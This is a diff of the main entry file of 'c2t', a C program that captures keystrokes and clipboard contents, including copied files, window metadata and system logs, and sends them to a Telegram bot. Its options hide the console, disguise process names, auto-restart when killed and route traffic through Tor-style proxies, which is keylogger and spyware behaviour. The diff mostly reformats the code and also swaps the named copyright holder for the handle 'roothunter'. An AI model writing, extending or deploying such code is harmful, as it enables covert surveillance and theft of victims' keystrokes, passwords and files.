@@ -1,5 +1,5 @@
 /*
- * Copyright (C) 2026 Antonio Ricciardi
+ * Copyright (C) 2026 roothunter
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -15,24 +15,24 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
+#include "c2t_version.h"
 #include "clipboard/clipboard.h"
 #include "clipboard/clipboard_output.h"
+#include "config/config.h"
 #include "keyboard/keyboard.h"
 #include "keyboard/keyboard_output.h"
-#include "config/config.h"
-#include "logging/logging.h"
 #include "logging/log_sender.h"
+#include "logging/logging.h"
 #include "runtime/runtime.h"
 #include "telegram/telegram.h"
 #include "telegram/telegram_listener.h"
-#include "c2t_version.h"
 
 #include <stdio.h>
 #include <string.h>
 
 #ifndef _WIN32
-#include <signal.h>
 #include <poll.h>
+#include <signal.h>
 #include <unistd.h>
 #if defined(__linux__) && defined(__GLIBC__)
 #include <malloc.h>
@@ -46,381 +46,399 @@
 #define C2T_STOP_TIMEOUT_MS 15000U
 
 typedef enum {
-    COMMAND_RUN,
-    COMMAND_START,
-    COMMAND_PAIR,
-    COMMAND_STATUS,
-    COMMAND_STOP,
-    COMMAND_RESTART,
-    COMMAND_HELP,
-    COMMAND_VERSION,
-    COMMAND_DAEMON_CHILD
+  COMMAND_RUN,
+  COMMAND_START,
+  COMMAND_PAIR,
+  COMMAND_STATUS,
+  COMMAND_STOP,
+  COMMAND_RESTART,
+  COMMAND_HELP,
+  COMMAND_VERSION,
+  COMMAND_DAEMON_CHILD
 } command_t;
 
-static void print_usage(FILE *stream)
-{
-    fprintf(stream,
-        "Usage: c2t <command> [options]\n"
-        "       c2t [options]             Run in the foreground\n\n"
-        "Commands:\n"
-        "  start       Start c2t in the background\n"
-        "  run         Run c2t in the foreground\n"
-        "  pair        Pair Telegram bot interactively via deep link\n"
-        "  status      Show whether c2t is running\n"
-        "  stop        Stop c2t gracefully\n"
-        "  restart     Stop and start c2t\n"
-        "  help        Show this help\n"
-        "  version     Show the version\n\n"
-        "Options for start, run and restart:\n"
-        "  -v, --verbose          Enable verbose logging\n"
-        "  -l, --log-file         Save logs to disk\n"
-        "  --auto-restart         Automatically restart daemon on crash or termination\n"
-        "  -H, --hide-console     Hide console window on startup\n"
-        "  --send-files           Send copied files\n"
-        "  --send-window-info     Include clipboard source metadata\n"
-        "  --send-logs            Periodically send system log files to Telegram\n"
-        "  --log-interval <sec>   Interval in seconds to send log files (5-86400)\n"
-        "  --send-keyboard        Enable keyboard monitoring\n"
-        "  --no-keyboard          Disable keyboard monitoring\n"
-        "  --keyboard-shortcuts   Enable capturing shortcut tags ([Ctrl+C], etc.)\n"
-        "  --no-keyboard-shortcuts Disable shortcut tags (default: clean text only)\n"
-        "  --keyboard-layout <code>  Set keyboard layout (it, us, uk, de, fr, es, pt, ch)\n"
-        "  --keyboard-flush <ms>  Inactivity delay before sending keystrokes (500-60000 ms)\n"
-        "  --send-clipboard       Enable clipboard monitoring\n"
-        "  --no-clipboard         Disable clipboard monitoring\n"
-        "  --proxy <url>          Use HTTP/HTTPS/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)\n"
+static void print_usage(FILE *stream) {
+  fprintf(
+      stream,
+      "Usage: c2t <command> [options]\n"
+      "       c2t [options]             Run in the foreground\n\n"
+      "Commands:\n"
+      "  start       Start c2t in the background\n"
+      "  run         Run c2t in the foreground\n"
+      "  pair        Pair Telegram bot interactively via deep link\n"
+      "  status      Show whether c2t is running\n"
+      "  stop        Stop c2t gracefully\n"
+      "  restart     Stop and start c2t\n"
+      "  help        Show this help\n"
+      "  version     Show the version\n\n"
+      "Options for start, run and restart:\n"
+      "  -v, --verbose          Enable verbose logging\n"
+      "  -l, --log-file         Save logs to disk\n"
+      "  --auto-restart         Automatically restart daemon on crash or "
+      "termination\n"
+      "  -H, --hide-console     Hide console window on startup\n"
+      "  --send-files           Send copied files\n"
+      "  --send-window-info     Include clipboard source metadata\n"
+      "  --send-logs            Periodically send system log files to "
+      "Telegram\n"
+      "  --log-interval <sec>   Interval in seconds to send log files "
+      "(5-86400)\n"
+      "  --send-keyboard        Enable keyboard monitoring\n"
+      "  --no-keyboard          Disable keyboard monitoring\n"
+      "  --keyboard-shortcuts   Enable capturing shortcut tags ([Ctrl+C], "
+      "etc.)\n"
+      "  --no-keyboard-shortcuts Disable shortcut tags (default: clean text "
+      "only)\n"
+      "  --keyboard-layout <code>  Set keyboard layout (it, us, uk, de, fr, "
+      "es, pt, ch)\n"
+      "  --keyboard-flush <ms>  Inactivity delay before sending keystrokes "
+      "(500-60000 ms)\n"
+      "  --send-clipboard       Enable clipboard monitoring\n"
+      "  --no-clipboard         Disable clipboard monitoring\n"
+      "  --proxy <url>          Use HTTP/HTTPS/SOCKS5 proxy (e.g. "
+      "socks5://127.0.0.1:9050)\n"
 #ifdef C2T_ENABLE_PROCESS_MASQUERADE
-        "  --daemon-name <name>   Set custom daemon process name (default: c2t)\n"
-        "  --supervisor-name <name>  Set custom supervisor process name (default: t2c)\n"
+      "  --daemon-name <name>   Set custom daemon process name (default: c2t)\n"
+      "  --supervisor-name <name>  Set custom supervisor process name "
+      "(default: t2c)\n"
 #endif
-        "\nStop options:\n"
-        "  --force                Force termination after the timeout\n");
+      "\nStop options:\n"
+      "  --force                Force termination after the timeout\n");
 }
 
-[[nodiscard]] static command_t parse_command(int argc, char **argv, int *option_offset)
-{
-    *option_offset = 1;
-    if (argc < 2)
-        return COMMAND_RUN;
-    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "help") == 0)
-        return COMMAND_HELP;
-    if (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-V") == 0 || strcmp(argv[1], "version") == 0)
-        return COMMAND_VERSION;
-    if (strcmp(argv[1], "__daemon_child") == 0 || strcmp(argv[1], "--daemon-child") == 0) {
-        *option_offset = 2;
-        return COMMAND_DAEMON_CHILD;
-    }
-    if (argv[1][0] == '-')
-        return COMMAND_RUN;
-    *option_offset = 2;
-    if (strcmp(argv[1], "start") == 0)
-        return COMMAND_START;
-    if (strcmp(argv[1], "run") == 0)
-        return COMMAND_RUN;
-    if (strcmp(argv[1], "pair") == 0)
-        return COMMAND_PAIR;
-    if (strcmp(argv[1], "status") == 0)
-        return COMMAND_STATUS;
-    if (strcmp(argv[1], "stop") == 0)
-        return COMMAND_STOP;
-    if (strcmp(argv[1], "restart") == 0)
-        return COMMAND_RESTART;
-    *option_offset = 0;
+[[nodiscard]] static command_t parse_command(int argc, char **argv,
+                                             int *option_offset) {
+  *option_offset = 1;
+  if (argc < 2)
     return COMMAND_RUN;
+  if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0 ||
+      strcmp(argv[1], "help") == 0)
+    return COMMAND_HELP;
+  if (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-V") == 0 ||
+      strcmp(argv[1], "version") == 0)
+    return COMMAND_VERSION;
+  if (strcmp(argv[1], "__daemon_child") == 0 ||
+      strcmp(argv[1], "--daemon-child") == 0) {
+    *option_offset = 2;
+    return COMMAND_DAEMON_CHILD;
+  }
+  if (argv[1][0] == '-')
+    return COMMAND_RUN;
+  *option_offset = 2;
+  if (strcmp(argv[1], "start") == 0)
+    return COMMAND_START;
+  if (strcmp(argv[1], "run") == 0)
+    return COMMAND_RUN;
+  if (strcmp(argv[1], "pair") == 0)
+    return COMMAND_PAIR;
+  if (strcmp(argv[1], "status") == 0)
+    return COMMAND_STATUS;
+  if (strcmp(argv[1], "stop") == 0)
+    return COMMAND_STOP;
+  if (strcmp(argv[1], "restart") == 0)
+    return COMMAND_RESTART;
+  *option_offset = 0;
+  return COMMAND_RUN;
 }
 
 [[nodiscard]] static const char *apply_service_options(int argc, char **argv,
-                                                      int option_offset)
-{
-    return c2t_config_apply_arguments(
-        argc - option_offset + 1, argv + option_offset - 1);
+                                                       int option_offset) {
+  return c2t_config_apply_arguments(argc - option_offset + 1,
+                                    argv + option_offset - 1);
 }
 
-[[nodiscard]] static int show_status(int quiet)
-{
-    c2t_runtime_status_t status;
-    int result = c2t_runtime_get_status(&status);
-    if (result < 0) {
-        if (!quiet)
-            fprintf(stderr, "Unable to read c2t daemon state\n");
-        return 1;
-    }
-    if (result == 0) {
-        if (!quiet)
-            puts("c2t is stopped");
-        return 3;
-    }
-    if (!quiet) {
-        printf("c2t is %s",
-               status.state == C2T_RUNTIME_RUNNING ? "running" : "starting");
-        if (status.process_id)
-            printf(" (PID %lu)", status.process_id);
-        putchar('\n');
-        const char *path = c2t_runtime_log_path();
-        if (path)
-            printf("Log: %s\n", path);
-    }
-    return 0;
-}
-
-[[nodiscard]] static int stop_service(int force, int quiet)
-{
-    int result = c2t_runtime_stop(C2T_STOP_TIMEOUT_MS, force);
-    if (result == 0) {
-        if (!quiet)
-            puts("c2t is already stopped");
-        return 0;
-    }
-    if (result > 0) {
-        if (!quiet)
-            puts("c2t stopped");
-        return 0;
-    }
-    if (result == -2)
-        fprintf(stderr, "c2t did not stop within 15 seconds; retry with "
-                        "'c2t stop --force'\n");
-    else
-        fprintf(stderr, "Unable to stop c2t\n");
+[[nodiscard]] static int show_status(int quiet) {
+  c2t_runtime_status_t status;
+  int result = c2t_runtime_get_status(&status);
+  if (result < 0) {
+    if (!quiet)
+      fprintf(stderr, "Unable to read c2t daemon state\n");
     return 1;
+  }
+  if (result == 0) {
+    if (!quiet)
+      puts("c2t is stopped");
+    return 3;
+  }
+  if (!quiet) {
+    printf("c2t is %s",
+           status.state == C2T_RUNTIME_RUNNING ? "running" : "starting");
+    if (status.process_id)
+      printf(" (PID %lu)", status.process_id);
+    putchar('\n');
+    const char *path = c2t_runtime_log_path();
+    if (path)
+      printf("Log: %s\n", path);
+  }
+  return 0;
 }
 
-[[nodiscard]] static int run_service_direct(int is_worker)
-{
-    if (!is_worker) {
-        int acquired = c2t_runtime_acquire();
-        if (acquired == 0) {
-            fprintf(stderr, "c2t is already running\n");
-            return 4;
-        }
-        if (acquired < 0) {
-            fprintf(stderr, "Unable to create the c2t daemon state\n");
-            return 1;
-        }
+[[nodiscard]] static int stop_service(int force, int quiet) {
+  int result = c2t_runtime_stop(C2T_STOP_TIMEOUT_MS, force);
+  if (result == 0) {
+    if (!quiet)
+      puts("c2t is already stopped");
+    return 0;
+  }
+  if (result > 0) {
+    if (!quiet)
+      puts("c2t stopped");
+    return 0;
+  }
+  if (result == -2)
+    fprintf(stderr, "c2t did not stop within 15 seconds; retry with "
+                    "'c2t stop --force'\n");
+  else
+    fprintf(stderr, "Unable to stop c2t\n");
+  return 1;
+}
+
+[[nodiscard]] static int run_service_direct(int is_worker) {
+  if (!is_worker) {
+    int acquired = c2t_runtime_acquire();
+    if (acquired == 0) {
+      fprintf(stderr, "c2t is already running\n");
+      return 4;
     }
+    if (acquired < 0) {
+      fprintf(stderr, "Unable to create the c2t daemon state\n");
+      return 1;
+    }
+  }
 
 #ifndef _WIN32
-    if (signal(SIGPIPE, SIG_IGN) == SIG_ERR)
-        c2t_log_warning("main", "Unable to disable fatal SIGPIPE handling");
+  if (signal(SIGPIPE, SIG_IGN) == SIG_ERR)
+    c2t_log_warning("main", "Unable to disable fatal SIGPIPE handling");
 #endif
-    c2t_log_info("main", "c2t starting (verbose logging enabled)");
-    c2t_log_info("config", "File path uploads=%s, max file size=%llu bytes",
-                 c2t_config_get()->telegram_send_files ? "enabled" : "disabled",
-                 (unsigned long long)c2t_config_get()->telegram_max_file_bytes);
-    c2t_log_info("config", "Clipboard source window information=%s",
-                 c2t_config_get()->telegram_send_window_info
-                     ? "enabled" : "disabled");
-    c2t_log_info("config", "Periodic Telegram log sending=%s, interval=%llu s",
-                 c2t_config_get()->telegram_send_logs ? "enabled" : "disabled",
-                 (unsigned long long)c2t_config_get()->telegram_log_interval_sec);
-    c2t_log_info("config", "Clipboard monitoring=%s",
-                 c2t_config_get()->disable_clipboard ? "disabled" : "enabled");
-    c2t_log_info("config", "Keyboard monitoring=%s, inactivity flush=%llu ms",
-                 c2t_config_get()->disable_keyboard ? "disabled" : "enabled",
-                 (unsigned long long)c2t_config_get()->keyboard_flush_ms);
-    c2t_log_info("config", "Delivery queue: max_items=%llu, max_bytes=%llu",
-                 (unsigned long long)c2t_config_get()->queue_max_items,
-                 (unsigned long long)c2t_config_get()->queue_max_bytes);
-    c2t_log_info("config", "Delivery retry policy: attempts=%llu, delay=%llu ms",
-                 (unsigned long long)c2t_config_get()->delivery_attempts,
-                 (unsigned long long)c2t_config_get()->retry_delay_ms);
-    c2t_log_info("config", "Auto restart on crash/kill=%s",
-                 c2t_config_get()->auto_restart ? "enabled" : "disabled");
-    c2t_log_info("config", "Network proxy=%s",
-                 (c2t_config_get()->proxy && *c2t_config_get()->proxy)
-                     ? c2t_config_get()->proxy : "disabled (direct connection)");
-    if (!telegram_init()) {
-        c2t_log_error("main", "Telegram initialization failed");
-        if (!is_worker) c2t_runtime_release();
-        return 1;
-    }
-    if (!c2t_config_get()->disable_clipboard && !clipboard_output_init()) {
-        c2t_log_error("main", "Clipboard delivery worker initialization failed");
-        telegram_cleanup();
-        if (!is_worker) c2t_runtime_release();
-        return 1;
-    }
-    if (!c2t_config_get()->disable_keyboard && !keyboard_output_init()) {
-        c2t_log_error("main", "Keyboard delivery worker initialization failed");
-        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
-        telegram_cleanup();
-        if (!is_worker) c2t_runtime_release();
-        return 1;
-    }
-    if (!c2t_log_sender_init()) {
-        c2t_log_error("main", "Log sender initialization failed");
-        if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
-        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
-        telegram_cleanup();
-        if (!is_worker) c2t_runtime_release();
-        return 1;
-    }
-    if (!c2t_telegram_listener_init()) {
-        c2t_log_error("main", "Telegram command listener initialization failed");
-        c2t_log_sender_cleanup();
-        if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
-        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
-        telegram_cleanup();
-        if (!is_worker) c2t_runtime_release();
-        return 1;
-    }
-    if (!c2t_config_get()->disable_keyboard) {
-        if (!keyboard_listener_init()) {
-            c2t_log_warning("main", "Keyboard listener initialization failed (continuing)");
-        }
-    }
-
+  c2t_log_info("main", "c2t starting (verbose logging enabled)");
+  c2t_log_info("config", "File path uploads=%s, max file size=%llu bytes",
+               c2t_config_get()->telegram_send_files ? "enabled" : "disabled",
+               (unsigned long long)c2t_config_get()->telegram_max_file_bytes);
+  c2t_log_info("config", "Clipboard source window information=%s",
+               c2t_config_get()->telegram_send_window_info ? "enabled"
+                                                           : "disabled");
+  c2t_log_info("config", "Periodic Telegram log sending=%s, interval=%llu s",
+               c2t_config_get()->telegram_send_logs ? "enabled" : "disabled",
+               (unsigned long long)c2t_config_get()->telegram_log_interval_sec);
+  c2t_log_info("config", "Clipboard monitoring=%s",
+               c2t_config_get()->disable_clipboard ? "disabled" : "enabled");
+  c2t_log_info("config", "Keyboard monitoring=%s, inactivity flush=%llu ms",
+               c2t_config_get()->disable_keyboard ? "disabled" : "enabled",
+               (unsigned long long)c2t_config_get()->keyboard_flush_ms);
+  c2t_log_info("config", "Delivery queue: max_items=%llu, max_bytes=%llu",
+               (unsigned long long)c2t_config_get()->queue_max_items,
+               (unsigned long long)c2t_config_get()->queue_max_bytes);
+  c2t_log_info("config", "Delivery retry policy: attempts=%llu, delay=%llu ms",
+               (unsigned long long)c2t_config_get()->delivery_attempts,
+               (unsigned long long)c2t_config_get()->retry_delay_ms);
+  c2t_log_info("config", "Auto restart on crash/kill=%s",
+               c2t_config_get()->auto_restart ? "enabled" : "disabled");
+  c2t_log_info("config", "Network proxy=%s",
+               (c2t_config_get()->proxy && *c2t_config_get()->proxy)
+                   ? c2t_config_get()->proxy
+                   : "disabled (direct connection)");
+  if (!telegram_init()) {
+    c2t_log_error("main", "Telegram initialization failed");
     if (!is_worker)
-        c2t_runtime_mark_running();
-    int result = 0;
-    if (!c2t_config_get()->disable_clipboard) {
-        c2t_log_info("main", "Starting clipboard listener");
-        result = clipboard_listen();
-        c2t_log_info("main", "Clipboard listener stopped with result %d", result);
-    } else {
-        c2t_log_info("main", "Clipboard listener disabled by configuration; waiting for runtime termination");
-        int stop_fd = c2t_runtime_stop_descriptor();
-        while (!c2t_runtime_stop_requested()) {
-#ifndef _WIN32
-            if (stop_fd >= 0) {
-                struct pollfd pfd = { .fd = stop_fd, .events = POLLIN, .revents = 0 };
-                (void)poll(&pfd, 1, 500);
-            } else {
-                usleep(100000);
-            }
-#else
-            (void)stop_fd;
-            Sleep(100);
-#endif
-        }
-    }
-    if (!c2t_config_get()->disable_keyboard) {
-        keyboard_listener_cleanup();
-    }
-    c2t_telegram_listener_cleanup();
-    c2t_log_sender_cleanup();
-    if (!c2t_config_get()->disable_keyboard) {
-        keyboard_output_cleanup();
-    }
-    if (!c2t_config_get()->disable_clipboard) {
-        clipboard_output_cleanup();
-    }
+      c2t_runtime_release();
+    return 1;
+  }
+  if (!c2t_config_get()->disable_clipboard && !clipboard_output_init()) {
+    c2t_log_error("main", "Clipboard delivery worker initialization failed");
     telegram_cleanup();
-    c2t_log_info("main", "Shutdown complete");
-    c2t_log_cleanup();
     if (!is_worker)
-        c2t_runtime_release();
-    return result;
-}
+      c2t_runtime_release();
+    return 1;
+  }
+  if (!c2t_config_get()->disable_keyboard && !keyboard_output_init()) {
+    c2t_log_error("main", "Keyboard delivery worker initialization failed");
+    if (!c2t_config_get()->disable_clipboard)
+      clipboard_output_cleanup();
+    telegram_cleanup();
+    if (!is_worker)
+      c2t_runtime_release();
+    return 1;
+  }
+  if (!c2t_log_sender_init()) {
+    c2t_log_error("main", "Log sender initialization failed");
+    if (!c2t_config_get()->disable_keyboard)
+      keyboard_output_cleanup();
+    if (!c2t_config_get()->disable_clipboard)
+      clipboard_output_cleanup();
+    telegram_cleanup();
+    if (!is_worker)
+      c2t_runtime_release();
+    return 1;
+  }
+  if (!c2t_telegram_listener_init()) {
+    c2t_log_error("main", "Telegram command listener initialization failed");
+    c2t_log_sender_cleanup();
+    if (!c2t_config_get()->disable_keyboard)
+      keyboard_output_cleanup();
+    if (!c2t_config_get()->disable_clipboard)
+      clipboard_output_cleanup();
+    telegram_cleanup();
+    if (!is_worker)
+      c2t_runtime_release();
+    return 1;
+  }
+  if (!c2t_config_get()->disable_keyboard) {
+    if (!keyboard_listener_init()) {
+      c2t_log_warning("main",
+                      "Keyboard listener initialization failed (continuing)");
+    }
+  }
 
-[[nodiscard]] static int run_service(void)
-{
-    return run_service_direct(0);
-}
-
-int main(int argc, char **argv)
-{
-#if defined(__linux__) && defined(__GLIBC__)
-    mallopt(M_ARENA_MAX, 1);
-    mallopt(M_TRIM_THRESHOLD, 64 * 1024);
-    mallopt(M_MMAP_THRESHOLD, 64 * 1024);
+  if (!is_worker)
+    c2t_runtime_mark_running();
+  int result = 0;
+  if (!c2t_config_get()->disable_clipboard) {
+    c2t_log_info("main", "Starting clipboard listener");
+    result = clipboard_listen();
+    c2t_log_info("main", "Clipboard listener stopped with result %d", result);
+  } else {
+    c2t_log_info("main", "Clipboard listener disabled by configuration; "
+                         "waiting for runtime termination");
+    int stop_fd = c2t_runtime_stop_descriptor();
+    while (!c2t_runtime_stop_requested()) {
+#ifndef _WIN32
+      if (stop_fd >= 0) {
+        struct pollfd pfd = {.fd = stop_fd, .events = POLLIN, .revents = 0};
+        (void)poll(&pfd, 1, 500);
+      } else {
+        usleep(100000);
+      }
+#else
+      (void)stop_fd;
+      Sleep(100);
 #endif
-    c2t_runtime_set_process_name("c2t", argc, argv);
-    c2t_config_load(argv[0]);
-    int option_offset;
-    command_t command = parse_command(argc, argv, &option_offset);
-    if (command == COMMAND_HELP) {
-        print_usage(stdout);
-        return 0;
     }
-    if (command == COMMAND_VERSION) {
-        printf("c2t %s\n", C2T_VERSION);
-        return 0;
-    }
-    if (command == COMMAND_STATUS) {
-        if (argc != 2) {
-            fprintf(stderr, "status does not accept options\n");
-            return 2;
-        }
-        return show_status(0);
-    }
-    if (command == COMMAND_STOP) {
-        int force = argc == 3 && strcmp(argv[2], "--force") == 0;
-        if (argc > 2 && !force) {
-            fprintf(stderr, "Unknown stop option: %s\n", argv[2]);
-            return 2;
-        }
-        return stop_service(force, 0);
-    }
+  }
+  if (!c2t_config_get()->disable_keyboard) {
+    keyboard_listener_cleanup();
+  }
+  c2t_telegram_listener_cleanup();
+  c2t_log_sender_cleanup();
+  if (!c2t_config_get()->disable_keyboard) {
+    keyboard_output_cleanup();
+  }
+  if (!c2t_config_get()->disable_clipboard) {
+    clipboard_output_cleanup();
+  }
+  telegram_cleanup();
+  c2t_log_info("main", "Shutdown complete");
+  c2t_log_cleanup();
+  if (!is_worker)
+    c2t_runtime_release();
+  return result;
+}
 
-    const char *invalid_option = apply_service_options(argc, argv, option_offset);
-    if (c2t_config_get()->hide_console &&
-        (command == COMMAND_RUN || command == COMMAND_START ||
-         command == COMMAND_RESTART || command == COMMAND_DAEMON_CHILD)) {
-        c2t_runtime_hide_console();
-    }
-    c2t_log_init();
-    if (invalid_option) {
-        c2t_log_error("main", "Unknown command or option: %s", invalid_option);
-        print_usage(stderr);
-        return 2;
-    }
+[[nodiscard]] static int run_service(void) { return run_service_direct(0); }
 
-    if (command == COMMAND_PAIR) {
-        const char *token = c2t_config_get()->telegram_bot_token;
-        if ((!token || !*token) && argc >= 3 && argv[2][0] != '-') {
-            token = argv[2];
-        }
-        if (!token || !*token) {
-            fprintf(stderr, "Error: TELEGRAM_BOT_TOKEN is required for pairing.\n");
-            fprintf(stderr, "Usage: c2t pair [BOT_TOKEN]\n");
-            return 1;
-        }
-        char paired_chat_id[128] = {};
-        if (telegram_pair(token, nullptr, paired_chat_id, sizeof(paired_chat_id), 60)) {
-            printf("\n[SUCCESS] Pairing complete!\n");
-            printf("[CONFIG]  TELEGRAM_BOT_TOKEN=%s\n", token);
-            printf("[CONFIG]  TELEGRAM_CHAT_ID=%s\n\n", paired_chat_id);
-            return 0;
-        }
-        return 1;
+int main(int argc, char **argv) {
+#if defined(__linux__) && defined(__GLIBC__)
+  mallopt(M_ARENA_MAX, 1);
+  mallopt(M_TRIM_THRESHOLD, 64 * 1024);
+  mallopt(M_MMAP_THRESHOLD, 64 * 1024);
+#endif
+  c2t_runtime_set_process_name("c2t", argc, argv);
+  c2t_config_load(argv[0]);
+  int option_offset;
+  command_t command = parse_command(argc, argv, &option_offset);
+  if (command == COMMAND_HELP) {
+    print_usage(stdout);
+    return 0;
+  }
+  if (command == COMMAND_VERSION) {
+    printf("c2t %s\n", C2T_VERSION);
+    return 0;
+  }
+  if (command == COMMAND_STATUS) {
+    if (argc != 2) {
+      fprintf(stderr, "status does not accept options\n");
+      return 2;
     }
-
-    if (command == COMMAND_RESTART) {
-        if (stop_service(0, 1) != 0)
-            return 1;
-        command = COMMAND_START;
+    return show_status(0);
+  }
+  if (command == COMMAND_STOP) {
+    int force = argc == 3 && strcmp(argv[2], "--force") == 0;
+    if (argc > 2 && !force) {
+      fprintf(stderr, "Unknown stop option: %s\n", argv[2]);
+      return 2;
     }
-    if (command == COMMAND_START) {
-        c2t_runtime_status_t status;
-        int was_running = c2t_runtime_get_status(&status);
-        if (was_running > 0) {
-            printf("c2t is already %s (PID %lu)\n",
-                   status.state == C2T_RUNTIME_RUNNING ? "running" : "starting",
-                   status.process_id);
-            return 0;
-        }
-        int background = c2t_runtime_start_background(
-            argc, argv, C2T_START_TIMEOUT_MS);
-        if (background == C2T_BACKGROUND_PARENT) {
-            (void)c2t_runtime_get_status(&status);
-            printf("c2t started (PID %lu)\n", status.process_id);
-            const char *path = c2t_runtime_log_path();
-            if (path)
-                printf("Log: %s\n", path);
-            return 0;
-        }
-        if (background == C2T_BACKGROUND_ERROR) {
-            fprintf(stderr, "Unable to start c2t; check %s\n",
-                    c2t_runtime_log_path() ? c2t_runtime_log_path() : "the log");
-            return 1;
-        }
+    return stop_service(force, 0);
+  }
+
+  const char *invalid_option = apply_service_options(argc, argv, option_offset);
+  if (c2t_config_get()->hide_console &&
+      (command == COMMAND_RUN || command == COMMAND_START ||
+       command == COMMAND_RESTART || command == COMMAND_DAEMON_CHILD)) {
+    c2t_runtime_hide_console();
+  }
+  c2t_log_init();
+  if (invalid_option) {
+    c2t_log_error("main", "Unknown command or option: %s", invalid_option);
+    print_usage(stderr);
+    return 2;
+  }
+
+  if (command == COMMAND_PAIR) {
+    const char *token = c2t_config_get()->telegram_bot_token;
+    if ((!token || !*token) && argc >= 3 && argv[2][0] != '-') {
+      token = argv[2];
     }
+    if (!token || !*token) {
+      fprintf(stderr, "Error: TELEGRAM_BOT_TOKEN is required for pairing.\n");
+      fprintf(stderr, "Usage: c2t pair [BOT_TOKEN]\n");
+      return 1;
+    }
+    char paired_chat_id[128] = {};
+    if (telegram_pair(token, nullptr, paired_chat_id, sizeof(paired_chat_id),
+                      60)) {
+      printf("\n[SUCCESS] Pairing complete!\n");
+      printf("[CONFIG]  TELEGRAM_BOT_TOKEN=%s\n", token);
+      printf("[CONFIG]  TELEGRAM_CHAT_ID=%s\n\n", paired_chat_id);
+      return 0;
+    }
+    return 1;
+  }
 
-    if (c2t_config_get()->is_worker)
-        return run_service_direct(1);
+  if (command == COMMAND_RESTART) {
+    if (stop_service(0, 1) != 0)
+      return 1;
+    command = COMMAND_START;
+  }
+  if (command == COMMAND_START) {
+    c2t_runtime_status_t status;
+    int was_running = c2t_runtime_get_status(&status);
+    if (was_running > 0) {
+      printf("c2t is already %s (PID %lu)\n",
+             status.state == C2T_RUNTIME_RUNNING ? "running" : "starting",
+             status.process_id);
+      return 0;
+    }
+    int background =
+        c2t_runtime_start_background(argc, argv, C2T_START_TIMEOUT_MS);
+    if (background == C2T_BACKGROUND_PARENT) {
+      (void)c2t_runtime_get_status(&status);
+      printf("c2t started (PID %lu)\n", status.process_id);
+      const char *path = c2t_runtime_log_path();
+      if (path)
+        printf("Log: %s\n", path);
+      return 0;
+    }
+    if (background == C2T_BACKGROUND_ERROR) {
+      fprintf(stderr, "Unable to start c2t; check %s\n",
+              c2t_runtime_log_path() ? c2t_runtime_log_path() : "the log");
+      return 1;
+    }
+  }
 
-    if (c2t_config_get()->auto_restart)
-        return c2t_runtime_run_supervisor(argc, argv);
+  if (c2t_config_get()->is_worker)
+    return run_service_direct(1);
 
-    return run_service();
+  if (c2t_config_get()->auto_restart)
+    return c2t_runtime_run_supervisor(argc, argv);
+
+  return run_service();
 }
